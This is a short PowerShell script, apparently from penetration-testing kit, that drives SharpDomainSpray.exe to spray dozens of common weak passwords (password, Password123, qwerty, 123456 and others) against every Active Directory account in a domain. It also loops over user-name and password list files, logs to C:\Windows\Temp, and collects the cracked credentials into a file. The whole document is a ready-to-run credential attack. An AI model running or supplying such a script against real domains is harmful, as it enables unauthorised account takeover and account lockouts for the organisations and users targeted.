



function getresults {
Get-Content .\sharpspray.log | findstr "Password is" | sort-object| Get-Unique > sharpspray_cracked.txt
cat sharpspray_cracked.txt
Write-Output ""
}

function run-sharpspray-large {
.\SharpDomainSpray.exe password
.\SharpDomainSpray.exe nimda
.\SharpDomainSpray.exe Secret123
.\SharpDomainSpray.exe Password123!!
.\SharpDomainSpray.exe password1
.\SharpDomainSpray.exe Password1!
.\SharpDomainSpray.exe P@55w0rd
.\SharpDomainSpray.exe PASSWORD
.\SharpDomainSpray.exe Password123
.\SharpDomainSpray.exe password123
.\SharpDomainSpray.exe qwerty
.\SharpDomainSpray.exe qwerty123
.\SharpDomainSpray.exe abc123
.\SharpDomainSpray.exe 1q2w3e
.\SharpDomainSpray.exe crest
.\SharpDomainSpray.exe csas
.\SharpDomainSpray.exe qwertyuiop
.\SharpDomainSpray.exe 000000
.\SharpDomainSpray.exe 111111
.\SharpDomainSpray.exe 12345
.\SharpDomainSpray.exe 123456
.\SharpDomainSpray.exe 1234567
.\SharpDomainSpray.exe 12345678
.\SharpDomainSpray.exe 123456789
.\SharpDomainSpray.exe 1234567890
.\SharpDomainSpray.exe 123123
.\SharpDomainSpray.exe 987654321
.\SharpDomainSpray.exe 654321
.\SharpDomainSpray.exe iloveyou
.\SharpDomainSpray.exe Nothing
.\SharpDomainSpray.exe Admin
.\SharpDomainSpray.exe ' '
.\SharpDomainSpray.exe letmein
.\SharpDomainSpray.exe monkey
.\SharpDomainSpray.exe dragon

ForEach ($user in Get-Content users.txt) {
.\SharpDomainSpray.exe $user
}
ForEach ($pass in Get-Content pass100.txt) {
.\SharpDomainSpray.exe $pass
}

}

function run-sharpspray-small {
.\SharpDomainSpray.exe password
.\SharpDomainSpray.exe nimda
.\SharpDomainSpray.exe Password123
.\SharpDomainSpray.exe Password123!!
.\SharpDomainSpray.exe Secret123
.\SharpDomainSpray.exe password1
.\SharpDomainSpray.exe Password1!
.\SharpDomainSpray.exe qwerty
.\SharpDomainSpray.exe abc123
.\SharpDomainSpray.exe 1q2w3e
}


run-sharpspray-small | tee C:\Windows\Temp\SharpSpray.log
getresults








 